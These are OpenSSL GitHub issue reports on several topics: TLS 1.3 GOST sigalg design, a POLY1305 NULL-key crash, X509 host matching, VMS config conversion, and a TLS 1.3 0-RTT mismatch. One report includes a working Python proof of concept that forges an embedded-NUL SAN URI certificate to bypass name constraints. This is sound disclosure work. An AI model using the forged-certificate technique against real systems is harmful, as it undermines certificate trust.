items.body:
# Design gap: multiple TLS 1.3 signature schemes sharing the same key type OID

## Summary

When implementing provider-based TLS 1.3 signature algorithms (specifically for GOST per [RFC 9367](https://www.rfc-editor.org/rfc/rfc9367)), we hit a fundamental incompatibility between three facts.

In OpenSSL, a key type NID and a provider `keymgmt` algorithm name are effectively the same identity - `ssl_cert_lookup_by_pkey()` resolves the key via `EVP_PKEY_is_a(pk, OBJ_nid2sn(nid))`, and `a_verify.c` checks the key via `EVP_PKEY_is_a(pkey, OBJ_nid2sn(pknid))`. Both paths collapse to the same `keymgmt` name. With that in mind:

1. **TLS 1.3 layer** assumes a **1:1 mapping** between `keymgmt` algorithm (key type NID) and signature scheme - one cert slot per key type
2. **X.509/CMS/CSR layer** resolves signature algorithms via **OID => NID => `keymgmt` name**, expecting each signature OID to map to a unique key type name

These constraints conflict with RFC 9367, which defines multiple TLS 1.3 code points sharing the same key type OID - and therefore the same keymgmt algorithm name.

---

## Fact 1: TLS 1.3 - one cert slot per key type

The `SSL_CTX` internally maintains a `CERT` structure with a dynamically-sized `pkeys[]` array. Slots `0..SSL_PKEY_NUM-1` (9 built-in) are for static key types (RSA, ECDSA, GOST, Ed25519, etc.), and slots `SSL_PKEY_NUM + i` are allocated for each provider-registered sigalg. In `ssl_setup_sigalgs()` ([ssl/t1_lib.c](https://github.com/openssl/openssl/blob/06deb63cbb328d499f25f3baff2a499df8d63fce/ssl/t1_lib.c)), each provider sigalg gets its own `sig_idx = i + SSL_PKEY_NUM`, so the **SIGALG_LOOKUP cache** correctly assigns a unique slot per sigalg.

However, **certificate loading** breaks this separation. `SSL_CTX_use_certificate()` calls `ssl_set_cert()` => `ssl_cert_lookup_by_pkey()`, which scans `ssl_cert_info[]` (static) and then `ctx->ssl_cert_info[]` (provider) and returns the **first match** by NID. When multiple provider sigalgs share the same `keymgmt` algorithm (same NID), `ssl_cert_lookup_by_pkey` always returns the same slot index - so each subsequent `SSL_CTX_use_certificate()` / `SSL_CTX_use_PrivateKey()` call **overwrites** the previously loaded cert+key. Only the last-loaded certificate is ever used, making it impossible to register distinct certificates for sigalgs that differ only in EC parameter set or TLSTREE mode.

> **Implication**: if a provider registers N signature schemes under one `keymgmt` name, `ssl_setup_sigalgs` allocates N distinct slots - but the cert-loading API has no way to target a specific one. The `keymgmt` name is the only lookup key, and it is ambiguous. So TLS 1.3 expects each signature scheme to map to a distinct key type.

> **Context**: [PR #29303 review discussion](https://github.com/openssl/openssl/pull/29303/files#r3249275614)

## Fact 2: X.509/CMS/CSR - OID-based algorithm resolution

[`crypto/asn1/a_verify.c:~161`](https://github.com/openssl/openssl/blob/06deb63cbb328d499f25f3baff2a499df8d63fce/crypto/asn1/a_verify.c#L161) resolves algorithms via OID:

```c
/* Convert signature OID into digest and public key OIDs */
OBJ_find_sigid_algs(OBJ_obj2nid(alg->algorithm), &mdnid, &pknid);

/* Check public key OID matches public key type */
EVP_PKEY_is_a(pkey, OBJ_nid2sn(pknid));
```

The chain: `Signature OID => OBJ_obj2nid => OBJ_find_sigid_algs => pknid => OBJ_nid2sn => EVP_PKEY_is_a()`. This expects `OBJ_nid2sn(pknid)` to produce a name matching a provider `keymgmt` algorithm name.

> **Implication**: the `keymgmt` algorithm name is anchored to the key type OID - it cannot be "multiplied" without breaking this verification chain. If a provider registers a `keymgmt` under a name that doesn't match `OBJ_nid2sn(pknid)` derived from the certificate's signature OID, `EVP_PKEY_is_a()` returns false and verification fails. This means you cannot invent artificial per-scheme `keymgmt` names to solve the TLS slot collision (Fact 1) - the X.509 layer will reject them.

## Fact 3: GOST - per‑curve signature algorithms in TLS 1.3; a single algorithm across multiple curves in X.509/CMS

[RFC 9367](https://www.rfc-editor.org/rfc/rfc9367) defines multiple TLS 1.3 code points under the same key type:

| Code point | Scheme | Key type OID | Key NID |
|---|---|---|---|
| `0x0709` | `gostr34102012_256a` | `id-GostR3410-2012-256` | `NID_id_GostR3410_2012_256` |
| `0x070A` | `gostr34102012_256b` | `id-GostR3410-2012-256` | `NID_id_GostR3410_2012_256` |
| `0x070B` | `gostr34102012_256c` | `id-GostR3410-2012-256` | `NID_id_GostR3410_2012_256` |
| `0x070C` | `gostr34102012_256d` | `id-GostR3410-2012-256` | `NID_id_GostR3410_2012_256` |
| `0x070D` | `gostr34102012_512a` | `id-GostR3410-2012-512` | `NID_id_GostR3410_2012_512` |
| `0x070E` | `gostr34102012_512b` | `id-GostR3410-2012-512` | `NID_id_GostR3410_2012_512` |
| `0x070F` | `gostr34102012_512c` | `id-GostR3410-2012-512` | `NID_id_GostR3410_2012_512` |

This creates a deadlock between Fact 1 and Fact 2:

- **From Fact 1**: to load distinct certificates for each scheme, each scheme needs a unique `keymgmt` name (otherwise `ssl_cert_lookup_by_pkey` collapses them into one slot). This would mean registering 7 artificial `keymgmt` algorithms for what is cryptographically 2 key types.
- **From Fact 2**: to pass the `a_verify.c` check, `OBJ_nid2sn(pknid)` must resolve to the provider's `keymgmt` name. But X.509 certificates carry the real key type OID (`id-GostR3410-2012-256`), not an artificial per-scheme OID. Registering artificial `keymgmt` names breaks X.509/CMS verification unless the OID-to-name mapping is also faked.

**Neither layer can be satisfied without breaking the other.** The TLS layer needs N distinct identities to allocate N cert slots; the X.509 layer needs those identities to match real OIDs in certificates. When a standard defines N signature schemes over 1 key type, these two requirements are contradictory.

---

## Where to fix?

### Option A: TLS layer - resolve cert slot by sigalg, not by key type

Add a new `keymgmt` parameter (e.g. `OSSL_PKEY_PARAM_TLS_SIGNATURE_SCHEME`) through which the provider can report which TLS 1.3 signature scheme a given key belongs to. For GOST, the key already carries an EC parameter set (paramSetA/B/C/D) that unambiguously determines the scheme - the provider just needs to expose this mapping.

The flow would change from:
```
ssl_cert_lookup_by_pkey(pkey) → EVP_PKEY_is_a(pkey, name) → first NID match → slot
```
to:
```
ssl_cert_lookup_by_pkey(pkey) → EVP_PKEY_get_params(OSSL_PKEY_PARAM_TLS_SIGALG_CODE_POINT)
    → code_point (e.g. 0x0709) → find matching SIGALG_LOOKUP → sig_idx → slot
```

This way `ssl_cert_lookup_by_pkey` would disambiguate keys that share an OID but belong to different signature schemes. The X.509/CMS layer stays untouched - `keymgmt` name remains tied to the real key type OID, only the TLS cert-loading path gets a second lookup dimension.

**Trade-off**: this leaks TLS-specific knowledge (code points) into the `keymgmt` layer, which is otherwise protocol-agnostic. However, the parameter is optional - providers that don't implement it fall back to the current NID-based lookup, so backward compatibility is preserved.

A more invasive alternative: redesign `ssl_cert_lookup_by_nid`/`ssl_cert_lookup_by_pkey` and `find_sig_alg()` to natively support multiple sigalgs per key type. The `SIGALG_LOOKUP.group_name` field (for provider sigalgs with bound EC groups) is a step in this direction, but the core cert-slot assumption remains.

### Option B: X.509/CMS layer - use `OSSL_SIGNATURE_PARAM_ALGORITHM_ID` instead of name matching

The signing path ([`crypto/asn1/a_sign.c:198`](https://github.com/openssl/openssl/blob/06deb63cbb328d499f25f3baff2a499df8d63fce/crypto/asn1/a_sign.c#L198)) **already uses** `OSSL_SIGNATURE_PARAM_ALGORITHM_ID` to get the DER-encoded `AlgorithmIdentifier` from the provider. The verification path (`a_verify.c`) could be made symmetric:

```c
// Current (a_verify.c:161) - name-based:
EVP_PKEY_is_a(pkey, OBJ_nid2sn(pknid))

// Alternative - OID-based, provider-aware:
EVP_PKEY_CTX_get_algor(pctx, &algor)
```

This decouples algorithm identity from name matching and lets providers registering multiple signature schemes under one key type work correctly in X.509/CMS.

## Conclusion
We are interested in adding support for GOST cryptography in OpenSSL covering TLS, X.509, and CMS. The TLS 1.3 GOST (RFC 9367) portion is proposed in [this PR](https://github.com/openssl/openssl/pull/29303). Unfortunately, the issues described above block a clean implementation, and we are ready to work on a fix - but would appreciate maintainer guidance on the preferred approach before investing in a full implementation: the TLS cert-slot lookup (Option A), the X.509 verification path (Option B), or something else entirely.

items.body:
### Summary

`EVP_MAC` POLY1305 handles some NULL-key initialization paths inconsistently.

In OpenSSL 3.5.6, the following initialization paths crash with `SIGSEGV`:

- `EVP_MAC_init(ctx, NULL, 0, NULL)`
- `EVP_MAC_init(ctx, NULL, 1, NULL)`
- `EVP_MAC_init(ctx, NULL, 0, end-only params)`

In the same matrix, other invalid key cases fail cleanly with `invalid key length` instead of crashing:

- non-NULL pointer with length `0`
- `OSSL_MAC_PARAM_KEY` set to a non-NULL pointer with length `0`, `1`, `31`, or `33`

A valid 32-byte key succeeds in both the direct-key and parameter-based paths.

This indicates that the crash is specific to NULL-key initialization paths, not to POLY1305 key-length validation in general.

### Minimal reproducer

A minimal standalone reproducer is attached:

- `openssl_poly1305_init_matrix_repro.cpp`

[openssl_poly1305_init_matrix_repro.cpp](https://github.com/user-attachments/files/28393777/openssl_poly1305_init_matrix_repro.cpp)

The reproducer runs each test case in a child process so that a crash in one case does not stop the full matrix.

The tested cases include:

- direct key argument with `NULL` and length `0`
- direct key argument with `NULL` and length `1`
- direct key argument with a non-NULL dummy pointer and length `0`
- direct key argument with a valid 32-byte key
- no direct key with no params
- no direct key with end-only params
- `OSSL_MAC_PARAM_KEY` with `NULL,0`
- `OSSL_MAC_PARAM_KEY` with a valid 32-byte key

### Observed behavior

Tested with OpenSSL 3.5.6.

```text

child_row,case,init_rc,update_rc,final_rc,out_len,stage,error_text
parent_row,library,algorithm,case,parent_status,signal,exit_code

parent,OpenSSL,POLY1305,direct_NULL_1,child_signal,11,-1
child,direct_dummy_0,0,-1,-1,64,init_failed,error:1C800069:Provider routines::invalid key length|not_run|not_run
parent,OpenSSL,POLY1305,direct_dummy_0,child_exit,0,1
child,direct_key_len_1,0,-1,-1,64,init_failed,error:1C800069:Provider routines::invalid key length|not_run|not_run
parent,OpenSSL,POLY1305,direct_key_len_1,child_exit,0,1
child,direct_key_len_31,0,-1,-1,64,init_failed,error:1C800069:Provider routines::invalid key length|not_run|not_run
parent,OpenSSL,POLY1305,direct_key_len_31,child_exit,0,1
child,direct_key_len_32,1,1,1,16,init_success,none|none|none
parent,OpenSSL,POLY1305,direct_key_len_32,child_exit,0,0
child,direct_key_len_33,0,-1,-1,64,init_failed,error:1C800069:Provider routines::invalid key length|not_run|not_run
parent,OpenSSL,POLY1305,direct_key_len_33,child_exit,0,1
parent,OpenSSL,POLY1305,params_absent_NULL_0,child_signal,11,-1
parent,OpenSSL,POLY1305,params_end_only,child_signal,11,-1
child,params_key_NULL_0,0,-1,-1,64,init_failed,error:1C800069:Provider routines::invalid key length|not_run|not_run
parent,OpenSSL,POLY1305,params_key_NULL_0,child_exit,0,1
child,params_key_NULL_1,0,-1,-1,64,init_failed,error:1C800069:Provider routines::invalid key length|not_run|not_run
parent,OpenSSL,POLY1305,params_key_NULL_1,child_exit,0,1
child,params_key_dummy_0,0,-1,-1,64,init_failed,error:1C800069:Provider routines::invalid key length|not_run|not_run
parent,OpenSSL,POLY1305,params_key_dummy_0,child_exit,0,1
child,params_key_len_1,0,-1,-1,64,init_failed,error:1C800069:Provider routines::invalid key length|not_run|not_run
parent,OpenSSL,POLY1305,params_key_len_1,child_exit,0,1
child,params_key_len_31,0,-1,-1,64,init_failed,error:1C800069:Provider routines::invalid key length|not_run|not_run
parent,OpenSSL,POLY1305,params_key_len_31,child_exit,0,1
child,params_key_len_32,1,1,1,16,init_success,none|none|none
parent,OpenSSL,POLY1305,params_key_len_32,child_exit,0,0
child,params_key_len_33,0,-1,-1,64,init_failed,error:1C800069:Provider routines::invalid key length|not_run|not_run
parent,OpenSSL,POLY1305,params_key_len_33,child_exit,0,1
exit_code=0
```

### Result summary

The crash cases are:

```text
direct_NULL_0:
  EVP_MAC_init(ctx, NULL, 0, NULL)
  => child process terminates with signal 11

direct_NULL_1:
  EVP_MAC_init(ctx, NULL, 1, NULL)
  => child process terminates with signal 11

params_absent_NULL_0:
  EVP_MAC_init(ctx, NULL, 0, NULL)
  => child process terminates with signal 11

params_end_only:
  EVP_MAC_init(ctx, NULL, 0, end-only params)
  => child process terminates with signal 11
```

The clean failure cases are:

```text
direct_dummy_0:
  EVP_MAC_init(ctx, dummy_ptr, 0, NULL)
  => returns failure with invalid key length

params_key_NULL_0:
  EVP_MAC_init(ctx, NULL, 0, params_with_OSSL_MAC_PARAM_KEY_NULL_0)
  => returns failure with invalid key length
```

The valid key controls succeed:

```text
direct_key_len_32:
  EVP_MAC_init(ctx, key32, 32, NULL)
  => init/update/final succeed

params_key_len_32:
  EVP_MAC_init(ctx, NULL, 0, params_with_OSSL_MAC_PARAM_KEY_key32)
  => init/update/final succeed
```

### Expected behavior

NULL or otherwise invalid POLY1305 keys should fail cleanly instead of crashing.

Expected behavior would be that these initialization paths return failure, preferably with the same `invalid key length` error used by the other invalid key cases.

items.body:
Whether this is a bug or a feature at this point is unclear, but I thought I'd file a bug, so that it can at least be an intentional choice one way or another. (We haven't yet evaluated callers for BoringSSL.)

`BIO_write` on a `BIO` backed by `FILE*` calls `fwrite` to write 1 object of size N instead of N objects of size 1. This means that `fwrite` will return:

* 1 if all N bytes were written
* 0 if < N bytes were written

In the (very unusual!) case that the write was partial, the caller won't know that there was a truncated write. That's inconsistent with every other `BIO`.

The main risk with fixing this is if some caller:

* Assumes a successful `BIO_write` wrote everything, and didn't carefully check the return value against the input length, just if it was negative.
* Only used `FILE*`-backed BIOs, so the above assumption is OK
* Was OK discarding information about partial writes because:
  * It's *highly* unusual, so treating it as a failure case is fine
  * It considered the file state a lost cause anyway, so it didn't care too much about preserving the partial write information

This behavior has been in OpenSSL since the oldest available commit. This comment suggests it was to work around some particularly bad stdio implementation back in the day, but it had some other side effects.

https://github.com/openssl/openssl/blob/openssl-4.0.0/crypto/bio/bss_file.c#L169-L180

**Description:**
There is a discrepancy between the OpenSSL documentation and the internal implementation of `EVP_CipherInit_ex` regarding the `enc` parameter. 

The official manual explicitly states that `enc` allows only the values `1`, `0`, or `-1`. However, dynamic analysis of some applications (specifically pre-built Nginx environments) reveals that an `enc` value of `2` is being passed to `EVP_CipherInit_ex`. 

Libcrypto successfully interprets and processes this value without throwing an error because of permissive internal implementation checks that use greater-than/lesser-than comparisons rather than strict equality checks.

**Expected Behavior:**
The implementation should either strictly reject undocumented values (like `2`) to prevent applications from relying on undefined behavior, **or the documentation should be updated to clarify how values greater than `1` are handled internally**.

**Observed Environment:**
This permissive handling was observed when analyzing the pre-built `nginx:1.27.4` docker image (ID `97662d24417b`) communicating with Libcrypto.

**Related Issue**
https://github.com/nginx/docker-nginx/issues/1050

labels.description: The issue was opened to report a bug
labels.name: issue: bug report

items.title: Documentation vs. Implementation conflict: EVP_CipherInit_ex tolerates 'enc' parameter value of 2

**Description:**
While analyzing internal function selection within OpenSSL using dynamic tracing, we noticed that OpenSSL's internal code paths do not fully adhere to the project's own public migration policies.

Specifically, there are active internal calls being made to `EVP_CIPHER_CTX_ctrl`. This function was officially deprecated in OpenSSL 3.0, and the official documentation strongly recommends migrating to the `OSSL_PARAM` interface for these operations.

**Expected Behavior:**
OpenSSL's internal implementation should migrate away from deprecated legacy APIs and utilize the modern `OSSL_PARAM` interface internally, matching the guidelines provided to external developers.

**Steps to Reproduce / Analysis Method:**
We identified this by monitoring the dependencies required to lift traces and observing the underlying API calls used in protocol implementations.
items.title: Internal technical debt: Active internal calls to legacy function EVP_CIPHER_CTX_ctrl

items.body:
Summary

The torture_rw_low test introduced in OpenSSL 3.3.0 fails reliably on AIX (both 32-bit and 64-bit) because AIX's pthread_rwlock_t is reader-preferring (POSIX-conformant), causing the two writer threads to starve for the entire ~4-second test window.

Symptom

 test_threads: torture_rw_low: Threads did not iterate

Root cause

torture_rw_low creates two reader threads that cycle tightly acquiring/releasing a read lock and two writer threads attempting write locks. On AIX, pthread_rwlock_t gives readers priority, so the writers never acquire the lock while readers are active.

pthread_rwlockattr_setkind_np (the Linux glibc mechanism to prefer writers) is not available on AIX, so there is no portable workaround short of excluding AIX from USE_RWLOCK.

Affected platforms

 - AIX 7.x / Power (32-bit and 64-bit)

Suggested fix

In crypto/threads_pthread.c, add !defined(OPENSSL_SYS_AIX) to the USE_RWLOCK guard, alongside the existing NonStop and RISC-V exclusions:

 #if !defined(OPENSSL_SYS_NONSTOP_KERNEL) && !defined(__riscv) && !defined(OPENSSL_SYS_AIX)
 # define USE_RWLOCK
 #endif

Prior art

OpenSSL already excludes NonStop (OPENSSL_SYS_NONSTOP_KERNEL) and RISC-V (__riscv) from USE_RWLOCK for platform-specific threading reasons. AIX deserves the same treatment.

labels.description: The issue was opened to report a bug
labels.name: issue: bug report

items.body:
# `X509_check_host()` matches IP address against dNSName SAN — RFC 9525 violation

## Summary

`X509_check_host()` performs a plain string match between the caller-supplied name and dNSName SAN entries, without validating that the dNSName content is a valid DNS name. When a certificate contains an IP address (e.g. `127.0.0.1`) encoded as a dNSName SAN entry instead of the correct iPAddress SAN entry, `X509_check_host()` incorrectly reports a match.

Per RFC 9525 Section 3:

> dNSName MUST NOT contain an IP address.

Other implementations (Go `crypto/x509`, BoringSSL) correctly reject this. This is a spec compliance issue, not a directly exploitable vulnerability.

## Steps to Reproduce

1. Generate a 3-tier certificate chain where the leaf has `DNS:127.0.0.1` in SAN (instead of `IP:127.0.0.1`)
2. Call `X509_check_host(leaf_cert, "127.0.0.1", -1, 0, NULL)`

**Expected:** Match fails — the name is an IP address and should only match iPAddress SAN entries, not dNSName.

**Actual:** Match succeeds — `X509_check_host()` performs a string comparison against the dNSName value without checking whether it contains an IP address.

PoC certificate chain (leaf cert excerpt):

```
Subject: CN = 127.0.0.1, O = GrayCert-127.0.0.1
X509v3 extensions:
    X509v3 Extended Key Usage:
        TLS Web Server Authentication
    X509v3 Subject Alternative Name:
        DNS:127.0.0.1
```

Full PEM chain attached below.

## Analysis

### Affected Code Path

`crypto/x509/v3_utl.c`, function `do_x509_check()`:

When `check_type == GEN_DNS`, the function iterates SAN entries, filters for GEN_DNS types, and calls `do_check_string()` to compare. There is no validation that the dNSName value is actually a DNS name and not an IP address literal.

### Why This Matters

- Applications calling `X509_check_host()` directly with an IP address string will get a false positive match against a non-compliant certificate.
- The higher-level `X509_VERIFY_PARAM` layer is NOT affected: `X509_VERIFY_PARAM_set1_host()` detects IP address input and routes to `X509_check_ip()` instead.
- `X509_V_FLAG_X509_STRICT` does not add dNSName content format validation.

### Differential Testing Results

| Implementation | Result |
|---|---|
| OpenSSL (default + x509_strict) | ACCEPT (incorrect) |
| Go crypto/x509 | REJECT (correct) |
| BoringSSL | REJECT (correct) |

## Suggested Fix

Add IP address detection in the `GEN_DNS` case of `do_x509_check()` (or in `do_check_string()`) to skip dNSName entries that contain IPv4 or IPv6 address literals. This could optionally be tied to `X509_V_FLAG_X509_STRICT` if strict behavior is desired.

Go's approach (in `crypto/x509/verify.go`) explicitly validates dNSName content and returns an error for IP address strings in DNS-type SANs.

## Affected Versions

All versions (1.x, 3.x, 4.0.0-dev / master). The code structure has been unchanged since the `X509_check_host()` API was introduced.

items.body:
<!--
Thank you for your bug report. If this is your first one,
please take the time to read the following lines before posting it.

NOTE:

    If you're asking about how to use OpenSSL, this isn't the right
    forum.  Please see our User Support resources:
    https://github.com/openssl/openssl/blob/master/SUPPORT.md

Please remember to tell us in what OpenSSL version you found the issue.

For build issues:

    If this is a build issue, please include the configuration output
    as well as a log of all errors.  Don't forget to include the exact
    commands you typed.

    With OpenSSL before 1.1.1, the configuration output comes from the
    configuration command.  With OpenSSL 1.1.1 and on, it's the output
    of `perl configdata.pm --dump`

For other issues:

    If it isn't a build issue, example code or commands to reproduce
    the issue is highly appreciated.
    Also, please remember to tell us if you worked with your own
    OpenSSL build or if it is system provided.

Please remember to put ``` lines before and after any commands plus
output and code, like this:

    ```
    $ echo output output output
    output output output
    ```

    ```
    #include <stdio.h>

    int main() {
        int foo = 1;
        printf("%d\n", foo);
    }
    ```
-->
`VMS/VMSify-conf.pl` classifies the `certs` config variable as a directory because CA Default has a certs directory entry. However the TSA section uses the `certs` variable as a file path. This causes incorrect VMS path conversion.

In `apps/openssl.cnf`, the TSA section defines:

```ini
[ tsa_config1 ]
certs		= $dir/cacert.pem	# Certificate chain to include in reply
```

This is a **file path** pointing to `cacert.pem`.

However, `VMS/VMSify-conf.pl` lists `certs` in `@directory_vars` (line 13):

```perl
my @directory_vars = ( "dir", "certs", "new_certs_dir" );
```

The directory conversion regex produces `$dir.cacert.pem]` which is VMS directory syntax, not file syntax. The correct VMS file syntax would be `$dir]cacert.pem`.

Steps to Reproduce:

```bash
echo 'certs		= $dir/cacert.pem	# Certificate chain' | perl VMS/VMSify-conf.pl
```

**Actual output:**
```
certs		= $dir.cacert.pem]	# Certificate chain
```

**Expected output:**
```
certs		= $dir]cacert.pem	# Certificate chain
```

## Root Cause

Historically, `certs` appeared in both:
- `[ CA_default ]`: `certs = $dir/certs` — a directory
- `[ tsa_config1 ]`: `certs = $dir/cacert.pem` — a file

The `@directory_vars` classification matched the CA_default usage. However, the CA_default `certs` setting was never used by any code (`apps/ca.c` has no `ENV_CERTS`), so only the TSA file usage is meaningful.

## Suggested Fix

In VMSify-conf.pl, move `certs` from `@directory_vars` to `@file_vars`.

## Dependency

This fix depends on the removal of the unused `certs` entry from `[ CA_default ]` sections first (see PR #31383 ).

The CA_default `certs = $dir/certs` is a directory path, while the TSA `certs = $dir/cacert.pem` is a file path. Currently `certs` is in `@directory_vars`, which is correct for CA_default but wrong for TSA.

If we move `certs` to `@file_vars` before removing the CA_default entry, the CA_default directory path would be incorrectly converted as a file.

Assuming we are content that we are now supporting C99 enough, and we don't care about MSVC < 2015, 

we can count on %zu existing in the printf family of functions. 

As it was quite reasonable to want to avoid the earlier pain of dealing with this, the frequent easy button
solution in code where we knew the value would not be excessive and/or it was a diagnostif printf was to
not care, use one of the integer types, and just cast the size_t to int or long. or unsigned long or whatever. 

(Oh boy, it might break on ridiculous values in the diagnostic, I don't care)

If the first assumption is correct, we should sweep the tree for use of printf class functions that cast a size_t to some other sort of type just for printing, and correct the printf to use %zu
items.title: Sweep tree for printf's of size_t cast to int, long, unsigned long etc. convert to %zu.

items.body:
### Description

`nc_uri()` in `crypto/x509/v3_ncons.c` compares a URI subjectAltName against a permitted URI name constraint *after* copying the SAN into a C string, so an embedded NUL byte truncates the host before the comparison. A sub-CA constrained to URIs under `allowed.example` can issue a leaf whose SAN URI is `http://allowed.example\0.blocked.example/path` and OpenSSL accepts it — a name-constraint enforcement bypass.

This is the classic embedded-NUL certificate trick (CVE-2009-2408 era) resurfacing in the URI name-constraint path. The other matchers were hardened against interior NULs long ago — `cn2dnsid()` and the email matcher both reject them with `memchr()` — but the `nc_uri()` rewrite in 3.5.0 reintroduced a `strlen`-on-a-C-string pattern with no such guard.

### The code

In `nc_uri()`:

```c
uri_copy = OPENSSL_strndup((const char *)uri->data, uri->length);
OSSL_parse_url(uri_copy, &scheme, NULL, &host, ...);
...
hostlen = (int)strlen(host);
... ia5ncasecmp(host, baseptr, hostlen) ...
```

The SAN URI is a length-delimited IA5String. `OPENSSL_strndup` stops at the first NUL, so for `http://allowed.example\0.blocked.example/path` the copy becomes `http://allowed.example`, `OSSL_parse_url` returns host `allowed.example`, and the constraint comparison matches. The `.blocked.example` portion after the NUL is never seen by the check, yet it is still present in the certificate that relying parties read. There is no `memchr(uri->data, 0, uri->length)` guard, unlike `cn2dnsid()` (`v3_utl.c`) and `nc_email_eai()`.

### How to reproduce

The script below generates a chain (root → intermediate constrained to URIs under host `allowed.example` → two leaves) and verifies both. `leaf_bad` uses host `allowed.example.blocked.example` (control, correctly rejected); `leaf_nul` is the same with a NUL after `allowed.example` (incorrectly accepted). Needs the `cryptography` package and an `openssl` built from 3.5, 3.6 or master.

```python
# pov_gen.py
import datetime
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.serialization import Encoding, PrivateFormat, NoEncryption

def key(): return ec.generate_private_key(ec.SECP256R1())
def name(cn): return x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, cn)])
now = datetime.datetime(2024,1,1); end = datetime.datetime(2034,1,1)

rk = key()
root = (x509.CertificateBuilder().subject_name(name("root")).issuer_name(name("root"))
    .public_key(rk.public_key()).serial_number(1).not_valid_before(now).not_valid_after(end)
    .add_extension(x509.BasicConstraints(True, None), True).sign(rk, hashes.SHA256()))

ik = key()
intc = (x509.CertificateBuilder().subject_name(name("int")).issuer_name(root.subject)
    .public_key(ik.public_key()).serial_number(2).not_valid_before(now).not_valid_after(end)
    .add_extension(x509.BasicConstraints(True, 0), True)
    .add_extension(x509.NameConstraints(
        permitted_subtrees=[x509.UniformResourceIdentifier("allowed.example")],
        excluded_subtrees=None), True)
    .sign(rk, hashes.SHA256()))

def leaf(uri, n):
    lk = key()
    san = x509.SubjectAlternativeName([x509.UniformResourceIdentifier(uri)])
    return (x509.CertificateBuilder().subject_name(name(n)).issuer_name(intc.subject)
        .public_key(lk.public_key()).serial_number(3).not_valid_before(now).not_valid_after(end)
        .add_extension(san, False).sign(ik, hashes.SHA256()))

bad = leaf("http://allowed.example.blocked.example/path", "leaf_bad")
nul = leaf("http://allowed.example\x00.blocked.example/path", "leaf_nul")

for fn, c in [("root.pem",root),("int.pem",intc),("leaf_bad.pem",bad),("leaf_nul.pem",nul)]:
    open(fn,"wb").write(c.public_bytes(Encoding.PEM))
print("wrote root.pem int.pem leaf_bad.pem leaf_nul.pem")
```

```console
$ python pov_gen.py
$ openssl verify -CAfile root.pem -untrusted int.pem leaf_bad.pem
C = ... error 47 at 0 depth lookup: permitted subtree violation     # correct

$ openssl verify -CAfile root.pem -untrusted int.pem leaf_nul.pem
leaf_nul.pem: OK                                                    # bypass
```

Confirmed on current master (`31d61a1ceb`). On 3.0.2 both certs are rejected, because that release uses the older length-aware `nc_uri`.

### Affected versions

3.5.0 and 3.6.0 onwards, and master. The affected `nc_uri` was introduced by commit `e599893a9f` ("x509: allow SAN URIs to contain userinfo", March 2025), first released in 3.5.0. Earlier branches (3.4 and down, 1.1.1, 1.0.2) use a length-aware `nc_uri` that is not affected.
items.title: URI name-constraint bypass via embedded NUL byte (nc_uri, v3_ncons.c)

items.body:
## Summary

TLS 1.3 early data can be accepted when the negotiated ciphersuite differs from the ciphersuite associated with the selected PSK, as long as both ciphersuites use the same hash.

Example:

- PSK/session cipher: `TLS_AES_128_CCM_SHA256`
- Negotiated cipher: `TLS_AES_128_CCM_8_SHA256`

or the reverse.

Both use SHA-256, so the current PSK compatibility check accepts the PSK. The server then accepts 0-RTT, but the CCM and CCM_8 variants use different authentication tag lengths. This leads to early-data decryption failure and a fatal `bad_record_mac` alert.

## Expected behavior

If a TLS 1.3 server selects a ciphersuite different from the ciphersuite associated with the selected PSK, it should reject early data and continue the 1-RTT PSK handshake where possible. Regular TLS 1.3 PSK resumption may still allow same-hash ciphersuite changes; the stricter requirement applies to 0-RTT.

## Actual behavior
`s->s3.tmp.new_cipher`.

This is observable with the CCM/CCM_8 pair:

- `TLS_AES_128_CCM_SHA256`
- `TLS_AES_128_CCM_8_SHA256`

The handshake negotiates successfully enough to accept early data, then fails with `bad_record_mac` while reading the 0-RTT records.

## Impact

This appears to be TLS 1.3 0-RTT spec non-compliance and an interoperability / denial-of-service issue.

## Reproducer

I reproduced it on current upstream master:

```text
d099e33e57 aes_wrap: prevent crash on update without a key
```

Generate a temporary certificate:

```
openssl req -x509 -newkey rsa:2048 -nodes \
    -subj "/CN=localhost" -days 1 \
    -keyout key.pem -out cert.pem
```

Create a PSK/session file associated with TLS_AES_128_CCM_SHA256:

```
openssl s_server \
    -accept 127.0.0.1:44443 \
    -cert cert.pem -key key.pem \
    -tls1_3 \
    -cipher "DEFAULT:@SECLEVEL=0" \
    -ciphersuites "TLS_AES_128_CCM_SHA256" \
    -max_early_data 16384 \
    -num_tickets 1 \
    -serverpref \
    -www -naccept 1
```

In another terminal:

```
printf "GET / HTTP/1.0\r\nHost: localhost\r\n\r\n" | \
openssl s_client \
    -connect 127.0.0.1:44443 \
    -servername localhost \
    -tls1_3 \
    -cipher "DEFAULT:@SECLEVEL=0" \
    -ciphersuites "TLS_AES_128_CCM_SHA256" \
    -sess_out sess_ccm.pem \
    -quiet -ign_eof
```

Now use that session as a PSK session, but negotiate TLS_AES_128_CCM_8_SHA256 and send early data:

```
printf "early-data-test" > early.txt

openssl s_server \
    -accept 127.0.0.1:44443 \
    -cert cert.pem -key key.pem \
    -tls1_3 \
    -cipher "DEFAULT:@SECLEVEL=0" \
    -ciphersuites "TLS_AES_128_CCM_8_SHA256:TLS_AES_128_CCM_SHA256" \
    -psk_session sess_ccm.pem \
    -max_early_data 16384 \
    -recv_max_early_data 16384 \
    -num_tickets 0 \
    -serverpref \
    -early_data \
    -www -naccept 1 -state
```

Client:

```
printf "GET / HTTP/1.0\r\nHost: localhost\r\n\r\n" | \
openssl s_client \
    -connect 127.0.0.1:44443 \
    -servername localhost \
    -tls1_3 \
    -cipher "DEFAULT:@SECLEVEL=0" \
    -ciphersuites "TLS_AES_128_CCM_8_SHA256:TLS_AES_128_CCM_SHA256" \
    -psk_session sess_ccm.pem \
    -early_data early.txt \
    -state -brief -no_ign_eof
```

Observed client-side result:

```
CONNECTION ESTABLISHED
Protocol version: TLSv1.3
Ciphersuite: TLS_AES_128_CCM_8_SHA256
SSL3 alert read:fatal:bad record mac
... ssl3_read_bytes:tls alert bad record mac ...
```

Observed server-side result:

```
SSL_accept:TLSv1.3 early data
SSL3 alert write:fatal:bad record mac
Error reading early data
... ossl_ccm_stream_update:cipher operation failed ...
... tls_get_more_records:decryption failed or bad record mac ...
```

The reverse direction also fails:

- PSK/session cipher: TLS_AES_128_CCM_8_SHA256
- Negotiated cipher: TLS_AES_128_CCM_SHA256

